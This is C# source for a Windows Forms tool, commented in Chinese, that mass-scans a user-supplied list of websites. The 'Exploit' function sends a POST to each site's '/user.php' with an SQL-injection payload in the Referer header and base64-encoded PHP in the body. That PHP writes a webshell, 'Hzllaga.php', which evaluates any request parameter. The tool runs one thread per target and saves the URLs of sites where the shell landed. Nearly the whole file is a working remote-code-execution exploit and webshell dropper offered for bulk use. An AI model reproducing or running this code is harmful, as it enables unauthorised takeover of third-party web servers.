using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using HttpCodeLib;
using System.IO;
using System.Threading;
using SkinSharp;
using System.Collections;
using System.Diagnostics;

namespace WindowsFormsApplication5
{

    public partial class Form1 : Form
    {
        public SkinH_Net skinh; //加载皮肤模块
        public Form1()
        {
            skinh = new SkinH_Net(); //定义皮肤变量
            skinh.Attach(); //加载皮肤
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false; //多线程之间控件可自由运用
        }

        public static string Exploit(string URL) //漏洞关键函数
        {
            string res = string.Empty;//清空请求结果,请求类型不是图片时有效
            string pdata = "hzllaga=eval(base64_decode($_POST[d]));echo HzllagaRCETestOK;exit;&d=ZmlsZV9wdXRfY29udGVudHMoJ0h6bGxhZ2EucGhwJywnPD9waHAgZXZhbCgkX1JFUVVFU1RbSHpsbGFnYV0pOz8%2BJyk7";//提交数据(必须项)

            System.Net.CookieContainer cc = new System.Net.CookieContainer();//自动处理Cookie对象
            HttpHelpers helper = new HttpHelpers();//发起请求对象
            HttpItems items = new HttpItems();//请求设置对象
            HttpResults hr = new HttpResults();//请求结果
            items.URL = URL + "/user.php";//请求的url地址
            items.Timeout = 5000;
            items.Referer = "554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:2:\"id\";s:3:\"'/*\";s:3:\"num\";s:201:\"*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b24687a6c6c616761275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262614870736247466e595630704f773d3d2729293b2f2f7d7d,0--\";s:4:\"name\";s:3:\"ads\";}554fcae493e564ee0dc75bdf2ebf94ca"; //referer头,如果需要请填写
            items.Accept = "*/*";
            items.UserAgent = "curl/7.35.0";
            items.ContentType = "application/x-www-form-urlencoded";
            items.Container = cc;//自动处理Cookie时,每次提交时对cc赋值即可
            items.Postdata = pdata;//提交的数据
            items.Method = "Post";//设置提交方式为post方式提交(默认为Get方式提交)
            hr = helper.GetHtml(items);//发起请求并获得结果
            res = hr.Html;//得到请求结果

            return res;
        }

        string[] url;
        List<string> listurl = new List<string>();
        List<string> listurlok = new List<string>();
        List<string> listurlsuccess = new List<string>();

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e) //加载url文件
        {
            OpenFileDialog fdlg = new OpenFileDialog(); //定义文件对话方块变量
            fdlg.Title = "选择文件"; //方块标题
            fdlg.InitialDirectory = ""; //方块目录
            fdlg.Filter = "文本文件（*.txt）|*.txt"; //文件格式
            fdlg.FilterIndex = 1; //定位默认格式
            fdlg.RestoreDirectory = true; //还原上次路径
            if (fdlg.ShowDialog() == DialogResult.OK)
            {
                StreamReader _rstream = new StreamReader(fdlg.FileName, System.Text.Encoding.Default); //读取txt
                string line;
                while ((line = _rstream.ReadLine()) != null) //将txt内容循环加入listview
                {
                    ListViewItem lvii = new ListViewItem(); //定义listview项目变量
                    lvii.Text = line; //第一格
                    lvii.SubItems.Add(""); //第二格
                    this.listView1.Items.Add(lvii); //将数据执行插入
                    listurl.Add(line); //加入listurl，当初有写入，现在也懒得去找还有没有用到，就先不删除
                }
                _rstream.Close();
                url = listurl.ToArray(); //将list加入数组
                label2.Text = Convert.ToString(url.Count()); //计算任务数量
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            progressBar1.Minimum = 0; //进度条最小值
            progressBar1.Maximum = url.Count(); //进度条最大值，也就是任务数量总数

            Thread waitT = new Thread(new ThreadStart(wait)); //定义线程，其实也可以不用这步，当初直接就复制过来了，懒得修改
            waitT.Start(); //启动线程

        }

        public void wait()
        {

            for (int i = 0; i < url.Count(); i++) //这边是扫描的核心
            {
                Book book = new Book(); //利用Book结构来达到多线程传递多参数，东西在下面自己找
                book.url = url[i]; //给定值，传参给线程用
                book.i = i; //同上
                Thread thread = new Thread(new ParameterizedThreadStart(Scan)); //定义线程
                thread.Start(book);//启动线程，一个任务一个线程
            }


        }

        public void Scan(object book) //调用扫描部分线程
        {
            try
            {
                Book b = (Book)book; //定义结构，方便调用传递过来的值
                string text = b.url; //把传递过来的任务赋值给text
                if (text.EndsWith("/")) //去掉url后面的/
                {
                    text = text.Substring(0, text.Length - 1);
                }

                string res = Exploit(text); //执行PoC

                if (res.IndexOf("HzllagaRCETestOK") > -1) //判断返回，确定是否存在漏洞
                {
                    if (res.IndexOf("Permission denied") > -1)
                    {
                        listView1.Items[b.i].SubItems[1].Text = "网站存在漏洞，但没权限写入。";
                        progressBar1.Value++;

                    }
                    else
                    {
                        listView1.Items[b.i].SubItems[1].Text = text + "/Hzllaga.php";
                        progressBar1.Value++;

                    }
                }
                else
                {
                    listView1.Items[b.i].SubItems[1].Text = "网站不存在漏洞或存在WAF！";
                    progressBar1.Value++;

                }
            }
            catch (Exception ex)
            {
                Trace.TraceError("出现异常:" + ex.Message);//记录日志}
                progressBar1.Value++;

            }
        }

        public struct Book //这里就是Book结构了
        {
            public string url;
            public int i;
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e) //保存成功的任务结果
        {
            int count = listView1.Items.Count; //计算任务数量

            StreamWriter _wstream = new StreamWriter("result/Success.txt"); //写入的文件名
            for (int i = 0; i < count; i++) //循序写入文件
            {
                string data = listView1.Items[i].SubItems[1].Text; //把任务结果赋值给data
                if (data.IndexOf("http") > -1) //判断结果是否有http，有则代表是成功的，需要保存
                {
                    _wstream.Write(data); //写入
                    _wstream.WriteLine(); //换行
                }
            }
            _wstream.Flush();
            _wstream.Close();
            MessageBox.Show("文件已保存到result/Success.txt");
        }

        private void button4_Click(object sender, EventArgs e) //保存有漏洞但没权限写入的任务
        {
            int count = listView1.Items.Count; //计算任务数量
            StreamWriter _wstream = new StreamWriter("result/OK.txt"); //写入的文件名
            for (int i = 0; i < count; i++) //循序写入文件
            {
                string data = listView1.Items[i].SubItems[1].Text; //把任务结果赋值给data
                string ok = listView1.Items[i].SubItems[0].Text;  //把任务赋值给ok
                if (data.IndexOf("没权限") > -1) //判断结果是否有http，有则代表是有漏洞但没权限写入的，需要保存
                {
                    _wstream.Write(ok); //写入
                    _wstream.WriteLine(); //换行
                }
            }
            _wstream.Flush();
            _wstream.Close();
            MessageBox.Show("文件已保存到result/OK.txt");
        }
    }
}

